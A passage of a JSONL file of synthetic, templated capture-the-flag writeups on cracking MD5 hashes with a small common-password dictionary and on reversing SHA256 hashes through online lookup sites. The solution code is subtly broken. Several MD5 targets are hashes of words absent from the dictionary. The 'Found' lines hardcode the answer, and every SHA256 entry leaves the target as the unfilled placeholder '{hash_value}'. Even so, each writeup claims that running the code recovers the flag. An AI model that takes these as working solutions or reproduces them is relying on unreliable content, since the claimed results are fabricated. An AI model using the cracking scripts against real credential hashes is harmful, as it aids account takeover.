except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/5", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833582", "synthetic": true}
{"id": "synthetic_hash_006", "team": "synthetic_team_3", "event": "CTF_2024_Event_12", "challenge_name": "MD5 Dictionary Attack #7", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/6", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833609", "synthetic": true}
{"id": "synthetic_hash_007", "team": "synthetic_team_8", "event": "CTF_2024_Event_5", "challenge_name": "SHA256 Rainbow Table #8", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/7", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833622", "synthetic": true}
{"id": "synthetic_hash_008", "team": "synthetic_team_3", "event": "CTF_2024_Event_2", "challenge_name": "MD5 Dictionary Attack #9", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/8", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833641", "synthetic": true}
{"id": "synthetic_hash_009", "team": "synthetic_team_4", "event": "CTF_2024_Event_18", "challenge_name": "MD5 Dictionary Attack #10", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/9", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.833668", "synthetic": true}
{"id": "synthetic_hash_010", "team": "synthetic_team_2", "event": "CTF_2024_Event_16", "challenge_name": "SHA256 Rainbow Table #11", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/10", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834259", "synthetic": true}
{"id": "synthetic_hash_011", "team": "synthetic_team_9", "event": "CTF_2024_Event_12", "challenge_name": "SHA256 Rainbow Table #12", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/11", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834283", "synthetic": true}
{"id": "synthetic_hash_012", "team": "synthetic_team_3", "event": "CTF_2024_Event_4", "challenge_name": "SHA256 Rainbow Table #13", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/12", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834301", "synthetic": true}
{"id": "synthetic_hash_013", "team": "synthetic_team_5", "event": "CTF_2024_Event_1", "challenge_name": "MD5 Dictionary Attack #14", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/13", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834322", "synthetic": true}
{"id": "synthetic_hash_014", "team": "synthetic_team_3", "event": "CTF_2024_Event_12", "challenge_name": "MD5 Dictionary Attack #15", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/14", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834342", "synthetic": true}
{"id": "synthetic_hash_015", "team": "synthetic_team_1", "event": "CTF_2024_Event_1", "challenge_name": "MD5 Dictionary Attack #16", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/15", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834360", "synthetic": true}
{"id": "synthetic_hash_016", "team": "synthetic_team_10", "event": "CTF_2024_Event_2", "challenge_name": "MD5 Dictionary Attack #17", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/16", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834378", "synthetic": true}
{"id": "synthetic_hash_017", "team": "synthetic_team_10", "event": "CTF_2024_Event_6", "challenge_name": "SHA256 Rainbow Table #18", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/17", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834393", "synthetic": true}
{"id": "synthetic_hash_018", "team": "synthetic_team_4", "event": "CTF_2024_Event_18", "challenge_name": "SHA256 Rainbow Table #19", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/18", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834407", "synthetic": true}
{"id": "synthetic_hash_019", "team": "synthetic_team_10", "event": "CTF_2024_Event_3", "challenge_name": "MD5 Dictionary Attack #20", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/19", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834428", "synthetic": true}
